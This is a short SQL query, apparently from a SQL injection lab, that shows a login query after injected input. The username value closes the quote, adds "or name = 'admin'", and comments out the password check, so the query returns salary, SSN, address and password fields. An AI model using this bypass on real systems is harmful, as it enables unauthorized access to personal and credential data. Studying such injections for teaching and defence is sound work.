SELECT id, name, eid, salary, birth, ssn,
phonenumber, address, email, nickname, Password
FROM credential
WHERE eid= '0000' or name = 'admin' # and password='$input_pwd'
